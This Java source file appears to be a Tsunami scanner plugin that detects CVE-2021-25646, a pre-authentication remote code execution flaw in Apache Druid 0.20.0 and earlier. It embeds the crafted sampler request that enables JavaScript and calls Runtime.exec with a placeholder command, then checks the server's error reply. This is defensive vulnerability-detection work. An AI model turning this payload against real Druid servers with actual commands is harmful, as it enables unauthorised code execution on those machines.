package com.google.tsunami.plugins.detectors.rce.cve202125646;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.net.MediaType;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

/**
 * A {@link VulnDetector} that detects the CVE-2021-25646 vulnerability.
 */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "ApacheDruidPreAuthRCECVE202125646VulnDetector",
    version = "1.0",
    description = "This detector checks for Apache Druid <= 0.20.0 CVE-2021-25646 "
        + "Pre-Auth RCE vulnerability.",
    author = "threedr3am (qiaoer1320@gmail.com)",
    bootstrapModule = ApacheDruidPreAuthRCECVE202125646VulnDetectorBootstrapModule.class
)
public class ApacheDruidPreAuthRCECVE202125646VulnDetector implements VulnDetector {

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final Clock utcClock;
  private final HttpClient httpClient;

  @Inject
  ApacheDruidPreAuthRCECVE202125646VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    HttpHeaders httpHeaders = HttpHeaders.builder()
        .addHeader(com.google.common.net.HttpHeaders.CONTENT_TYPE, MediaType.JSON_UTF_8.toString())
        .build();

    String payload = "{\"type\": \"index\", \"spec\": {\"ioConfig\": {\"type\": \"index\", "
        + "\"inputSource\": {\"type\": \"inline\", \"data\": \"{\\\"isRobot\\\":true,"
        + "\\\"channel\\\":\\\"#x\\\",\\\"timestamp\\\":\\\"2021-2-1T14:12:24.050Z\\\","
        + "\\\"flags\\\":\\\"x\\\",\\\"isUnpatrolled\\\":false,\\\"page\\\":\\\"1\\\","
        + "\\\"diffUrl\\\":\\\"https://xxx.com\\\",\\\"added\\\":1,"
        + "\\\"comment\\\":\\\"Botskapande Indonesien omdirigering\\\","
        + "\\\"commentLength\\\":35,\\\"isNew\\\":true,\\\"isMinor\\\":false,"
        + "\\\"delta\\\":31,\\\"isAnonymous\\\":true,\\\"user\\\":\\\"Lsjbot\\\","
        + "\\\"deltaBucket\\\":0,\\\"deleted\\\":0,\\\"namespace\\\":\\\"Main\\\"}\"}, "
        + "\"inputFormat\": {\"type\": \"json\", \"keepNullColumns\": true}}, "
        + "\"dataSchema\": {\"dataSource\": \"sample\", "
        + "\"timestampSpec\": {\"column\": \"timestamp\", "
        + "\"format\": \"iso\"}, \"dimensionsSpec\": {}, "
        + "\"transformSpec\": {\"transforms\": [], \"filter\": {\"type\": \"javascript\", "
        + "\"dimension\": \"added\", \"function\": \"function(value) {%s}\", "
        + "\"\": {\"enabled\": true}}}}, \"type\": \"index\", "
        + "\"tuningConfig\": {\"type\": \"index\"}}, \"samplerConfig\": {\"numRows\": 500, "
        + "\"timeoutMs\": 15000}}";
    ByteString normalBody = ByteString.copyFromUtf8(
        String.format(payload, ""));
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
        + "druid/indexer/v1/sampler";
    try {
      HttpResponse response = httpClient.send(
          post(targetUri).setHeaders(httpHeaders).setRequestBody(normalBody).build(),
          networkService);
      if (response.status() == HttpStatus.OK && response.bodyString().isPresent()
          && response.bodyString().get()
          .equals("{\"numRowsRead\":0,\"numRowsIndexed\":0,\"data\":[]}")) {
        ByteString errorBody = ByteString.copyFromUtf8(
            String.format(payload, "java.lang.Runtime.getRuntime().exec('error_cmd')"));
        response = httpClient.send(
            post(targetUri).setHeaders(httpHeaders).setRequestBody(errorBody).build(),
            networkService);
        if (response.status() == HttpStatus.OK && response.bodyString().isPresent()
            && response.bodyString().get().contains("Failed to sample data")) {
          return true;
        }
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
    }
    return false;
  }

  public DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder().setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE_2021_25646"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Apache Druid <= 0.20.0 CVE-2021-25646 Pre-Auth RCE vulnerability")
                .setDescription(
                    "Apache Druid includes the ability to execute user-provided JavaScript code "
                        + "embedded in various types of requests. "
                        + "This functionality is intended for use in high-trust environments, "
                        + "and is disabled by default. "
                        + "However, in Druid 0.20.0 and earlier, it is possible for an "
                        + "authenticated user "
                        + "to send a specially-crafted request that forces Druid to run "
                        + "user-provided "
                        + "JavaScript code for that request, regardless of server configuration. "
                        + "This can be leveraged to execute code on the target machine with the "
                        + "privileges of the Druid server process."
                        + "https://nvd.nist.gov/vuln/detail/CVE-2021-25646")
                .setRecommendation("Update 0.20.1 released, or later released.")
        )
        .build();
  }
}
